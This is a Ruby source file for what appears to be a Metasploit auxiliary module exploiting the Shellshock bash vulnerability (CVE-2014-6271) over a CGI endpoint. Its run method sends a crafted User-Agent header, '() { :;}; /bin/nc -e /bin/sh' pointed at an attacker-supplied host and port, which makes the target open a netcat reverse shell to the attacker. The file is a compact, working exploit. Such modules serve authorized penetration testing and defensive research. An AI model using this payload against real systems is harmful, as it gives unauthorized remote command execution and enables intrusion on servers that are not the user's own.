##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit4 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Bash Specially-Crafted Environment Variables Code Injection Attack',
      'Description' => %q{
        This module exploits a remote command injection vulnerability in bash,
        a popular shell environment, over an HTTP CGI vector. By passing a specially-crafted
        string that is set as an environment variable, attckers may execute arbitrary operating
        system commands.

        For this version of the exploit, the target must already have netcat (nc) compiled with the
        -e option.
      },
      'Author' => ['wvu'],
      'References' => [
        ['CVE', '2014-6271'],
        ['URL', 'https://securityblog.redhat.com/2014/09/24/bash-specially-crafted-environment-variables-code-injection-attack/'],
        ['URL', 'https://access.redhat.com/site/solutions/1207723']
      ],
      'DisclosureDate' => 'Sep 24 2014',
      'License' => MSF_LICENSE
    ))

    register_options([
      OptString.new('TARGETURI', [true, 'Path to CGI script']),
      OptAddress.new('LHOST', [true, 'Local host for reverse shell']),
      OptPort.new('LPORT', [true, 'Local port for reverse shell'])
    ], self.class)
  end

  def run
    begin
      send_request_cgi(
        'method' => 'GET',
        'uri' => normalize_uri(target_uri.path),
        'agent' => "() { :;}; /bin/nc -e /bin/sh #{datastore['LHOST']} #{datastore['LPORT']} &"
      )
    rescue Rex::ConnectionRefused, Rex::ConnectionTimeout,
           Rex::HostUnreachable => e
      fail_with(Failure::Unreachable, e)
    ensure
      disconnect
    end
  end

end
